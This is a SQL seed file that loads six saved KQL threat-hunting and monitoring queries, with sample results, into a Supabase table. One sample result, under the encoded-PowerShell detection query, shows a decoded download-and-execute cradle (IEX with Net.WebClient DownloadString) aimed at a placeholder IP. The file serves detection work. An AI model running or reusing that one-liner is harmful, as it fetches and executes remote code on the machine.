-- Six starter queries. Optional. Run after schema.sql in the Supabase SQL editor.
-- Safe to re-run: existing ids are skipped.

insert into public.queries (id, title, status, tags, description, query, sample_results) values
  ($s$7a4c7f0e-3a1d-4b7e-9c2f-1d5e8a9b0c01$s$, $s$Failed sign-ins by user (last 24h)$s$, $s$works$s$, array[$t$entra$t$, $t$signinlogs$t$, $t$authentication$t$]::text[], $s$Counts failed interactive sign-ins per user over the last day. Result type 0 is success, everything else is a failure code.$s$, $q$SigninLogs
| where TimeGenerated > ago(24h)
| where ResultType != "0"
| summarize Failures = count(), LastSeen = max(TimeGenerated) by UserPrincipalName, ResultType
| order by Failures desc
| take 20$q$, $j${"columns":["UserPrincipalName","ResultType","Failures","LastSeen"],"rows":[["jdoe@contoso.com","50126","14","2026-10-29T18:42:10Z"],["svc-backup@contoso.com","50053","9","2026-10-29T17:03:55Z"],["mchen@contoso.com","50076","3","2026-10-29T12:11:02Z"]]}$j$::jsonb),
  ($s$7a4c7f0e-3a1d-4b7e-9c2f-1d5e8a9b0c02$s$, $s$Machines that stopped sending heartbeats$s$, $s$works$s$, array[$t$heartbeat$t$, $t$monitoring$t$, $t$agents$t$]::text[], $s$Lists computers whose last heartbeat is older than 30 minutes. Useful for spotting agents that are offline or broken.$s$, $q$Heartbeat
| summarize LastHeartbeat = max(TimeGenerated) by Computer, OSType
| where LastHeartbeat < ago(30m)
| extend MinutesSilent = datetime_diff("minute", now(), LastHeartbeat)
| order by MinutesSilent desc$q$, $j${"columns":["Computer","OSType","LastHeartbeat","MinutesSilent"],"rows":[["web-prod-03","Linux","2026-10-29T02:15:00Z","1047"],["dc-east-01","Windows","2026-10-29T18:50:00Z","52"]]}$j$::jsonb),
  ($s$7a4c7f0e-3a1d-4b7e-9c2f-1d5e8a9b0c03$s$, $s$Windows 4625 logon failures by source IP$s$, $s$mostly$s$, array[$t$securityevent$t$, $t$windows$t$, $t$bruteforce$t$]::text[], $s$Groups failed logons (event 4625) by source address. Works, but IpAddress is often '-' for local logons, so those get lumped together and should be filtered out.$s$, $q$SecurityEvent
| where TimeGenerated > ago(1d)
| where EventID == 4625
| summarize Attempts = count(), Accounts = dcount(TargetUserName) by IpAddress, Computer
| where Attempts > 10
| order by Attempts desc$q$, $j${"columns":["IpAddress","Computer","Attempts","Accounts"],"rows":[["203.0.113.57","rdp-gw-01","412","38"],["-","fileserver-02","27","2"]]}$j$::jsonb),
  ($s$7a4c7f0e-3a1d-4b7e-9c2f-1d5e8a9b0c04$s$, $s$PowerShell with encoded commands$s$, $s$works$s$, array[$t$defender$t$, $t$deviceprocessevents$t$, $t$powershell$t$, $t$hunting$t$]::text[], $s$Finds PowerShell launches that use -EncodedCommand (or shortened forms) in the last 7 days and decodes the payload for review.$s$, $q$DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any ("-enc", "-EncodedCommand", "-e ")
| extend Encoded = extract(@"-[eE][nN]?[cC]?[a-zA-Z]*\s+([A-Za-z0-9+/=]{20,})", 1, ProcessCommandLine)
| extend Decoded = base64_decode_tostring(Encoded)
| project Timestamp, DeviceName, AccountName, Decoded, ProcessCommandLine$q$, $j${"columns":["Timestamp","DeviceName","AccountName","Decoded"],"rows":[["2026-10-28T09:12:44Z","laptop-114","asmith","IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')"]]}$j$::jsonb),
  ($s$7a4c7f0e-3a1d-4b7e-9c2f-1d5e8a9b0c05$s$, $s$CPU utilization trend per computer$s$, $s$works$s$, array[$t$perf$t$, $t$cpu$t$, $t$timechart$t$]::text[], $s$Average processor time in 15-minute bins for the last 6 hours, rendered as a time chart.$s$, $q$Perf
| where TimeGenerated > ago(6h)
| where ObjectName == "Processor" and CounterName == "% Processor Time" and InstanceName == "_Total"
| summarize AvgCpu = avg(CounterValue) by bin(TimeGenerated, 15m), Computer
| render timechart$q$, $j${"columns":["TimeGenerated","Computer","AvgCpu"],"rows":[["2026-10-30T08:00:00Z","app-01","23.4"],["2026-10-30T08:15:00Z","app-01","71.9"],["2026-10-30T08:00:00Z","app-02","12.1"]]}$j$::jsonb),
  ($s$7a4c7f0e-3a1d-4b7e-9c2f-1d5e8a9b0c06$s$, $s$Azure resource deletions by caller$s$, $s$broken$s$, array[$t$azureactivity$t$, $t$audit$t$, $t$governance$t$]::text[], $s$Intended to list who deleted which resources. Currently returns nothing in my workspace, probably because the schema uses OperationNameValue rather than OperationName in newer tables. Needs fixing.$s$, $q$AzureActivity
| where TimeGenerated > ago(30d)
| where OperationName endswith "delete"
| where ActivityStatus == "Succeeded"
| project TimeGenerated, Caller, ResourceGroup, Resource, OperationName
| order by TimeGenerated desc$q$, $j${"columns":["TimeGenerated","Caller","ResourceGroup","Resource","OperationName"],"rows":[]}$j$::jsonb)
on conflict (id) do nothing;
